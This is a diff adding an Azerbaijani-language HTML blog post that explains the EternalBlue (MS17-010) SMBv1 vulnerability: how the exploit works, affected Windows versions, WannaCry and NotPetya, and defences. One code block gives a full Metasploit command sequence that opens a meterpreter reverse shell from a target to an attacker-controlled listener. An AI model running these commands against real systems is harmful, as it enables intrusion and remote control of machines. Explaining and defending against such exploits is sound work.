@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>POST #2 – EternalBlue (MS17-010) Dərin Analiz</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding: 40px;
+    }
+    h1, h2 {
+      color: #ff0033;
+      text-shadow: 0 0 15px red;
+    }
+    .post-container {
+      background: #111;
+      padding: 30px;
+      border-left: 5px solid #ff0033;
+      box-shadow: 0 0 25px #ff0033;
+    }
+    .meta {
+      color: #999;
+      font-size: 0.9em;
+      margin-bottom: 20px;
+    }
+    .code-block {
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      margin: 20px 0;
+      border: 1px solid #333;
+      font-size: 0.9em;
+      overflow-x: auto;
+    }
+    a {
+      color: #ff0044;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="post-container">
+    <h1>💣 EternalBlue (MS17-010) – Kernel səviyyəsində sızma</h1>
+    <p class="meta">Yazan: <strong>ISKOPISIX</strong> | Tarix: 07.06.2025 | Qovluq: <em>Exploit / Kernel Hacking</em></p>
+
+    <h2>🧠 Nədir EternalBlue?</h2>
+    <p>
+        2017-ci ilin aprel ayında, Shadow Brokers adlı qaranlıq bir haker qrupu, ABŞ Milli Təhlükəsizlik Agentliyinə (NSA) məxsus olan məxfi istismar paketini sızdırdı. Bu paketdə yer alan ən təhlükəli istismarlardan biri EternalBlue (MS17-010) exploit idi.
+
+        Bu exploit, Windows əməliyyat sistemlərindəki SMBv1 (Server Message Block) protokolundakı bir zəiflikdən istifadə edərək sistemə uzaqdan, autentifikasiya olmadan daxil olmağa imkan verir.
+    </p>
+
+    <h2>⚠️ Zəiflik Nədir?</h2>
+    <p>
+        Zəiflik, proqram təminatı və ya sistem dizaynındakı kritik çatışmazlıqdır ki, bu da hücumçulara sistemin gözlənilməz şəkildə idarəsini ələ keçirmək, məlumatları oğurlamaq və ya zərərli fəaliyyət göstərmək imkanı verir. EternalBlue zəifliyi bu anlayışın ən qorxunc nümunələrindən biridir. Bu zəiflik Microsoft-un SMBv1 (Server Message Block version 1) protokolundakı yaddaşın idarə olunmasında olan buffer overflow səhvindən qaynaqlanır.
+
+        SMBv1 protokolu şəbəkədə fayl, printer və digər resursların paylaşımını təmin edir və Windows əməliyyat sistemlərinin əsas hissəsini təşkil edir. Lakin onun implementasiyasında olan bu zəiflik, hücumçuya crafted edilmiş (yəni xüsusi hazırlanmış) SMB paketləri göndərərək sistem yaddaşında sərhədləri aşan dəyişikliklər etməyə imkan yaradır. Bu da arbitrar kod icrasına (arbitrary code execution) gətirib çıxarır, yəni hücumçu sistemin istənilən hissəsində öz zərərli kodunu icra edə bilir.
+        
+        Ən kritik tərəfi isə EternalBlue zəifliyinin kernel səviyyəsində işləməsidir. Kernel səviyyəsi əməliyyat sisteminin ən yüksək icazə səviyyəsidir və burada kod icra etmək hücumçuya tam sistem nəzarəti deməkdir. Hücumçu bu səviyyədə tam administrator hüquqları ilə əməliyyatlar apara, sistemdə arxa qapılar qura, məlumatları oğurlaya və ya sistemi tamamilə sıradan çıxara bilər.
+        
+        Bu zəiflik, crafted edilmiş SMB paketləri vasitəsilə həyata keçirilir və ona görə də hücum üçün istifadəçi müdaxiləsi tələb olunmur — yalnız hədəf sistemin şəbəkə üzərində açıq SMBv1 portuna malik olması kifayətdir. EternalBlue zəifliyi həm də özünü şəbəkə daxilində digər sistemlərə yayıla bilən bir worm kimi istifadə edilməsinə imkan verir ki, bu da kütləvi və sürətli hücumlara şərait yaradır.
+        
+        Beləliklə, EternalBlue zəifliyi sistemin ən dərin təbəqələrindəki buffer overflow səhvindən istifadə edərək, hücumçunun kernel səviyyəsində istənilən kodu icra etməsinə şərait yaradır. Bu zəiflik, müasir kibertəhlükəsizlik tarixində ən təhlükəli və dağıdıcı boşluqlardan biri kimi qiymətləndirilir.
+    </p>
+
+    <h2>📎 Təsirə məruz qalan sistemlər:</h2>
+    <ul>
+      <li>Windows XP / 7 / 8 / 10</li>
+      <li>Windows Server 2003 / 2008 / 2012</li>
+      <li>Patch edilməmiş sistemlər (MS17-010 olmayanlar)</li>
+    </ul>
+
+    <h2>🛠️ Exploitin Mexanizması</h2>
+    <p>EternalBlue aşağıdakı mərhələlər üzrə işləyir:</p>
+    <ol>
+      <li><strong>SMB Connection:</strong>SMB Bağlantısının Qurulması
+        İlk addımda, hücumçu hədəf sistemə şəbəkə üzərindən port 445 vasitəsilə SMB (Server Message Block) protokolu ilə əlaqə yaradır. SMB protokolu Windows sistemlərində fayl və digər resursların paylaşılıb idarə olunması üçün istifadə olunur və EternalBlue zəifliyi məhz SMBv1 versiyasında mövcuddur. Bu mərhələdə hücumçu hədəf maşına SMB sessiyası açaraq onunla əlaqəni aktivləşdirir və exploit üçün zəruri mühiti təmin edir. </li>
+
+
+      <li><strong>Trans2 Request Overflow:</strong> Trans2 Request ilə Buffer Overflow Yaratmaq
+        Hücumun əsas hədəfi buffer overflow zəifliyidir. EternalBlue, SMBv1 protokolundakı "Trans2" (Transaction2) əmri çərçivəsində crafted edilmiş xüsusi paketlər göndərərək hədəf sistemin yaddaşında sərhəd aşımı yaradır. Bu buffer overflow, server tərəfdə yaddaşın kernel stack sahəsində tutarsızlıq yaradaraq sistemin normal yaddaş idarəsini pozur. Bu mərhələ hücumun təməlini təşkil edir və hücumçunun yaddaşda öz kodunu yerləşdirməsi üçün imkan yaradır.</li>
+
+
+      <li><strong>Shellcode Injection:</strong> Shellcode-in Yaddaşa İnjeksiya Edilməsi
+Buffer overflow vəziyyətindən sonra, hücumçu kernel stack üzərinə zərərli shellcode-u yerləşdirir. Shellcode - xüsusi yazılmış kompakt kod parçasıdır ki, məqsədi sistemdə istənilən əməliyyatı həyata keçirməkdir. Bu mərhələdə hücumçunun yerləşdirdiyi shellcode, sistemin icazələrini aşaraq kernel səviyyəsində işləyir və hücumçunun tam nəzarətini təmin edir. Shellcode kernel yaddaşında uğurla yerləşdirildikdə, hücum üçün əsas zəruri mərhələ tamamlanır.</li>
+
+
+      <li><strong>RCE:</strong> Arbitrar Kodun SYSTEM İcazələri ilə İcrası (RCE)
+        Shellcode kernel səviyyəsində icra olunduqdan sonra, hücumçu SYSTEM hüquqları ilə istənilən kodu icra edə bilir. SYSTEM hüquqları Windows əməliyyat sistemində ən yüksək icazə səviyyəsidir və bu səviyyədə tam idarəetmə əldə etmək deməkdir. Bu da hücumçunun hədəf sistemdə arxa qapılar açması, məlumat oğurlaması, əlavə malware yerləşdirməsi və ya tam sistem nəzarətini ələ keçirməsi kimi təhlükəli əməliyyatlar aparmasına imkan verir.</li>
+    </ol>
+
+    <h2>💻 Exploit Misalı (Metasploit ilə)</h2>
+    <div class="code-block">
+<pre>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.100.8
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.100.9
+set LPORT 4444
+exploit
+</pre>
+    </div>
+
+    <h2>🔥 Real İstifadə</h2>
+    <p>
+        EternalBlue exploit-i kibertəhlükəsizlik tarixində ən geniş və dağıdıcı kiberhücumlarda istifadə edilmişdir. 2017-ci ildə EternalBlue, xüsusilə WannaCry və NotPetya adlı iki böyük ransomware hücumunun əsas vasitəsi olmuşdur. Bu hücumlar milyonlarla cihazı yoluxduraraq, dövlət qurumları, şirkətlər və müxtəlif infrastruktur obyektlərinin fəaliyyətini ciddi şəkildə poza bilmişdir.
+
+        WannaCry ransomware-i 2017-ci ilin may ayında sürətlə yayılaraq yüz minlərlə kompüterə yoluxdu. EternalBlue zəifliyindən istifadə etməklə şəbəkəyə bağlı cihazlara avtomatik yayılırdı və yoluxdurulmuş sistemləri bloklayaraq istifadəçilərdən fidyə tələb edirdi. Bu hücum, Böyük Britaniya Milli Səhiyyə Xidməti (NHS) kimi kritik qurumlarda xidmətlərin dayanmasına, əməliyyatların ləğvinə səbəb oldu və dünya üzrə 200,000-dən çox sistem yoluxdu.
+        
+        NotPetya isə 2017-ci ilin iyununda baş verən daha dağıdıcı bir hücum idi. EternalBlue-nun yanında digər üsullardan da istifadə edərək, məqsəd yalnız məlumatları şifrələmək yox, həm də onları tamamilə silmək idi. Bu hücum Ukrayna hökumət orqanları, enerji şirkətləri və beynəlxalq korporasiyalara milyardlarla dollarlıq zərər vurdu.
+        
+        Bu real hadisələr EternalBlue-nun təhlükəsinin nə qədər böyük olduğunu ortaya qoydu. Microsoft artıq 2017-ci ilin martında MS17-010 təhlükəsizlik yamasını çıxarmışdı, lakin bir çox sistemdə bu yeniləmələr vaxtında tətbiq edilmədi və hücumların qarşısı alınmadı. EternalBlue exploit-in geniş yayılması şəbəkə təhlükəsizliyi tədbirlərinin gücləndirilməsini, SMBv1 protokolunun deaktiv edilməsini və mütəmadi təhlükəsizlik yeniləmələrinin vacibliyini göstərdi.
+        
+        Nəticədə, EternalBlue-nun real həyatda tətbiqi yalnız texniki zəifliyin deyil, həm də kibertəhlükəsizlik sahəsində insan faktoru və idarəetmənin əhəmiyyətini vurğuladı. Bu zəiflik üzərindən baş verən hücumlar, kiberhücumların həm iqtisadi, həm də sosial təsirinin nə qədər ciddi ola biləcəyini göstərdi.
+    </p>
+
+    <h2>🛡️ Müdafiə Yolları</h2>
+    <ul>
+      <li><strong>MS17-010</strong> patchini tətbiq et (Windows Security Update - March 2017).</li>
+      <li>SMBv1 protokolunu sistemdən tamamilə deaktiv et.</li>
+      <li>445 TCP portunu firewall ilə bağla.</li>
+      <li>Network segmentation və EDR ilə hücumların qarşısını al.</li>
+    </ul>
+
+    <h2>📂 Əlavə Alətlər</h2>
+    <ul>
+      <li><strong>nmap -p445 --script smb-vuln-ms17-010</strong> ilə zəiflik aşkarlanması</li>
+      <li><strong>eternalblue-2.2.0.rb</strong> – custom Ruby exploit</li>
+      <li><strong>BlueKeep və DoublePulsar</strong> ilə kombinasiya edilə bilər</li>
+    </ul>
+
+    <p><a href="index.html">← Geri Qayıt</a></p>
+  </div>
+</body>
+</html>
